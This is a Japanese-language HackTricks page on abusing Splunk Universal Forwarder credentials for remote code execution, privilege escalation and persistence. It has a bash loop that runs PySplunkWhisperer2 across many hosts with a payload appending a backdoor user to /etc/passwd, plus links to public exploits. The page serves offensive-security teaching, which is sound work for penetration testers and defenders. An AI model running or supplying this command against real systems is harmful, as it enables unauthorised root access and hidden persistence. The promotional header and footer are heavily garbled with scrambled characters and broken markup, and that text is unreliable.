# Splunk LPE and Persistence

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

もし**内部**または**外部**でマシンを**列挙**しているときに**Splunkが実行中**（ポート8090）で、運良く**有効な認証情報**を知っている場合、**Splunkサービスを悪用**して**シェルを実行**することができます。もしrootが実行している場合、特権をrootに昇格させることができます。

また、もし**すでにrootであり、Splunkサービスがlocalhostのみにリッスンしていない場合**、**Splunkサービスから**パスワードファイルを**盗み**、パスワードを**クラッキング**するか、**新しい**認証情報を追加することができます。そして、ホスト上で持続性を維持します。

以下の最初の画像では、Splunkdのウェブページがどのように見えるかを示しています。



## Splunk Universal Forwarder Agent Exploit Summary

詳細については、投稿[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)を確認してください。これは単なる要約です：

**Exploit Overview:**
Splunk Universal Forwarder Agent（UF）をターゲットにしたエクスプロイトは、エージェントパスワードを持つ攻撃者がエージェントを実行しているシステム上で任意のコードを実行できるようにし、ネットワーク全体を危険にさらす可能性があります。

**Key Points:**
- UFエージェントは、受信接続やコードの真正性を検証しないため、不正なコード実行に対して脆弱です。
- 一般的なパスワード取得方法には、ネットワークディレクトリ、ファイル共有、内部文書での発見が含まれます。
- 成功したエクスプロイトは、侵害されたホスト上でSYSTEMまたはrootレベルのアクセス、データの流出、さらなるネットワーク侵入につながる可能性があります。

**Exploit Execution:**
1. 攻撃者がUFエージェントパスワードを取得します。
2. Splunk APIを利用してエージェントにコマンドやスクリプトを送信します。
3. 可能なアクションには、ファイル抽出、ユーザーアカウント操作、システムの侵害が含まれます。

**Impact:**
- 各ホストでSYSTEM/rootレベルの権限を持つ完全なネットワーク侵害。
- 検出を回避するためのログの無効化の可能性。
- バックドアやランサムウェアのインストール。

**Example Command for Exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**利用可能な公開エクスプロイト:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Splunkクエリの悪用

**詳細については、[https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)を確認してください**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
